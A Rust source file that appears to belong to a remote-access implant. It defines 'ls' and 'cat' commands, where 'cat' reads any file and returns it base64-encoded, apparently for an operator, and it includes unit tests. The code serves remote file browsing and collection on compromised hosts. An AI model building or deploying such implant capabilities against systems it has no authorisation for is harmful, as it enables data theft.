use std::fs::{read, read_dir};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;

use crate::commands::{CommandMeta, CommandResult, ImplantComand, ImplantContext};

pub struct LsCommand;
pub struct CatCommand;

impl LsCommand {
    const META: CommandMeta = CommandMeta {
        name: "ls",
        description: "List files in a directory",
        usage: "ls <dir>",
    };
}

impl CatCommand {
    const META: CommandMeta = CommandMeta {
        name: "cat",
        description: "Read a file",
        usage: "cat <file_path>",
    };
}

impl ImplantComand for LsCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        let path = if args.is_empty() {
            ctx.cwd.clone()
        } else {
            args[0].clone()
        };

        let entries = match read_dir(&path) {
            Ok(e) => e,
            Err(err) => {
                return CommandResult {
                    success: false,
                    output: err.to_string(),
                };
            }
        };

        let mut output = String::new();

        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            let prefix = if file_type.is_dir() { "d" } else { "f" };
            let name = entry.file_name().to_string_lossy().to_string();
            let Ok(meta) = entry.metadata() else { continue };
            let perms = meta.permissions();
            let size = meta.len();
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = perms.mode();
                output.push_str(&format!(
                    "{prefix} {:o} {:>8}  {name}\n",
                    mode & 0o777,
                    size
                ));
            }

            #[cfg(not(unix))]
            {
                let ro = if perms.readonly() { "r-" } else { "rw" };
                output.push_str(&format!("{prefix} {ro} {:>8}  {name}\n", size));
            }
        }

        CommandResult {
            success: true,
            output,
        }
    }
}

impl ImplantComand for CatCommand {
    fn meta(&self) -> &CommandMeta {
        &Self::META
    }

    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
        if args.is_empty() {
            return CommandResult {
                success: false,
                output: "usage cat <file_path>".to_string(),
            };
        }
        let full_path = ctx.resolve_path(&args[0]);

        let output = match read(full_path) {
            Ok(bytes) => STANDARD.encode(&bytes),
            Err(err) => {
                return CommandResult {
                    success: false,
                    output: err.to_string(),
                };
            }
        };

        CommandResult {
            success: true,
            output,
        }
    }
}

#[cfg(test)]
mod test {
    use super::*;
    use crate::commands::test_context;

    #[test]
    fn test_ls() {
        let cmd = LsCommand;
        let mut ctx = test_context();
        let dir = std::env::temp_dir();
        let args = &[dir.to_string_lossy().to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, true);
        assert!(!result.output.is_empty());
    }

    #[test]
    fn test_ls_invalid_path() {
        let cmd = LsCommand;
        let mut ctx = test_context();
        let dir = "an invalid dir";
        let args = &[dir.to_string()];

        let result = cmd.execute(args, &mut ctx);
        assert_eq!(result.success, false);
        assert!(!result.output.is_empty());
    }

    #[test]
    fn test_cat_file() {
        let path = std::env::temp_dir().join("konq_test_cat.txt");
        std::fs::write(&path, "test content").unwrap();
        let cmd = CatCommand;
        let mut ctx = test_context();
        let result = cmd.execute(&[path.to_string_lossy().to_string()], &mut ctx);
        assert!(result.success);
        // output is base64 encoded
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&result.output)
            .unwrap();
        assert_eq!(decoded, b"test content");
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn test_cat_non_existent_file() {
        let cmd = CatCommand;
        let mut ctx = test_context();
        let result = cmd.execute(&["im_totally_invalid.txt".to_string()], &mut ctx);
        assert_eq!(result.success, false);
    }
}
